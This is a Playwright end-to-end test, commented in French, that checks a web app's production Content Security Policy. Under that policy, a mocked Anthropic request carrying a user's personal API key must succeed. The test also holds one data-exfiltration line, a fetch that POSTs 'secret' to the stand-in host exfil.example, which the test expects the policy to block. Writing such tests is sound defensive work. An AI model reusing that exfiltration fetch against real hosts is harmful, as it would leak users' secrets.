// e2e — mode « clé personnelle » sous la CSP de PRODUCTION (décision du
// 2026-10-14, journal carto, question 22). Avec `connect-src 'self'`, le
// navigateur refusait tout appel direct vers un fournisseur : les runs avec
// clé personnelle et les relances du dialogue ne pouvaient pas fonctionner
// sur le site en ligne. La CSP est lue dans web/public/.htaccess (pas une
// copie retapée) et posée sur le document servi par le dev-server. Seule
// retouche : script-src admet les scripts en ligne du dev-server (préambule
// de React) — le site construit n'en a pas. connect-src, la directive en
// jeu, est EXACTEMENT celle de la production.
//
// Parcours : dialogue de la cartographie, relance demandée à Anthropic avec
// une clé personnelle → la requête part (simulée ici, jamais vers le vrai
// fournisseur), la clé voyage dans l'en-tête et nulle part ailleurs ; un
// hôte qui n'est pas un fournisseur reste bloqué par la même CSP.
//
// LOCAL UNIQUEMENT (docs/tests-e2e.md) : dev-server Vite seul, aucune API.
//   npx playwright test e2e/csp-cle-personnelle.e2e.js

import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { test, expect } from '@playwright/test'
import { LOU_PORTFOLIO, kairosDoc, louDays } from '../src/carto/test/fixtures.js'

function productionCsp() {
  const htaccess = readFileSync(fileURLToPath(new URL('../public/.htaccess', import.meta.url)), 'utf8')
  const m = htaccess.match(/Header always set Content-Security-Policy\s+"([^"]+)"/)
  if (!m) throw new Error('CSP de production introuvable dans web/public/.htaccess')
  return m[1]
}

/** La CSP de production, script-src élargi aux scripts en ligne du dev-server. */
function devServableCsp() {
  const csp = productionCsp()
  if (!/connect-src [^;]+/.test(csp)) throw new Error('connect-src absent de la CSP de production')
  return csp.replace(/script-src [^;]+/, "script-src 'self' 'unsafe-inline' blob:")
}

const louFiles = () => [
  { name: 'journal-de-lou.md', mimeType: 'text/markdown', buffer: Buffer.from(LOU_PORTFOLIO) },
  ...Object.entries(louDays()).map(([date, poles]) => ({
    name: `${date}.json`,
    mimeType: 'application/json',
    buffer: Buffer.from(JSON.stringify({ date, poles, kairos: kairosDoc(date) })),
  })),
]

const CORS = {
  'access-control-allow-origin': '*',
  'access-control-allow-headers': '*',
  'access-control-allow-methods': 'POST, OPTIONS',
}

test('clé personnelle sous la CSP de production : la relance part vers le fournisseur, un autre hôte reste bloqué', async ({ page }) => {
  const csp = devServableCsp()
  const violations = []
  const errors = []
  page.on('pageerror', (e) => errors.push(e.message))
  page.on('console', (m) => /Content Security Policy/i.test(m.text()) && violations.push(m.text()))

  // La CSP de production sur le document principal.
  await page.route('**/*', async (route) => {
    const req = route.request()
    if (req.resourceType() === 'document' && req.frame() === page.mainFrame()) {
      const resp = await route.fetch()
      await route.fulfill({ response: resp, headers: { ...resp.headers(), 'content-security-policy': csp } })
      return
    }
    await route.fallback()
  })
  // Le fournisseur, simulé : on n'appelle jamais le vrai.
  const anthropic = []
  await page.route('https://api.anthropic.com/**', async (route) => {
    const req = route.request()
    if (req.method() === 'OPTIONS') return route.fulfill({ status: 204, headers: CORS })
    anthropic.push({ url: req.url(), headers: req.headers(), body: req.postDataJSON() })
    return route.fulfill({
      status: 200,
      headers: { ...CORS, 'content-type': 'application/json' },
      body: JSON.stringify({
        id: 'msg_test',
        type: 'message',
        role: 'assistant',
        model: 'claude-sonnet-4-6',
        content: [{ type: 'text', text: 'Qu’est-ce qui vous a décidé à reformuler ?' }],
        stop_reason: 'end_turn',
        usage: { input_tokens: 10, output_tokens: 8 },
      }),
    })
  })
  const exfil = []
  await page.route('https://exfil.example/**', async (route) => {
    exfil.push(route.request().url())
    await route.fulfill({ status: 200, headers: CORS, body: 'reçu' })
  })

  await page.goto('/#/cartographie')
  await page.locator('input[type="file"][accept]').setInputFiles(louFiles())
  await page.locator('[data-tile="sun"] .carto-sun').waitFor()

  await test.step('La relance avec clé personnelle passe la CSP de production', async () => {
    await page.getByRole('link', { name: 'Dialogue', exact: true }).click()
    await page.getByLabel('Votre réponse').fill('Je reformulais pour vérifier.')
    await page.getByRole('button', { name: 'Répondre' }).click()
    await page.getByText('Relances par un modèle de langage (facultatif)').click()
    await page.getByRole('combobox', { name: /Modèle de langage/ }).selectOption('anthropic')
    await page.getByLabel(/Clé d’API/).fill('sk-ant-cle-personnelle-de-test')
    await page.getByRole('checkbox', { name: /J’accepte que, pour chaque relance/ }).check()
    await page.getByRole('button', { name: 'Demander une relance à Anthropic (Claude)' }).click()
    await expect(page.getByText('Qu’est-ce qui vous a décidé à reformuler ?')).toBeVisible()
    expect(anthropic).toHaveLength(1)
    expect(anthropic[0].url).toBe('https://api.anthropic.com/v1/messages')
    expect(anthropic[0].headers['x-api-key']).toBe('sk-ant-cle-personnelle-de-test')
    expect(JSON.stringify(anthropic[0].body)).not.toContain('sk-ant')
  })

  await test.step('Un hôte qui n’est pas un fournisseur reste bloqué par la même CSP', async () => {
    const outcome = await page.evaluate(() =>
      fetch('https://exfil.example/fuite', { method: 'POST', body: 'secret', mode: 'no-cors' }).then(
        () => 'parti',
        () => 'bloqué',
      ),
    )
    expect(outcome).toBe('bloqué')
    expect(exfil).toEqual([])
    expect(violations.some((v) => v.includes('exfil.example'))).toBe(true)
  })

  expect(errors).toEqual([])
})
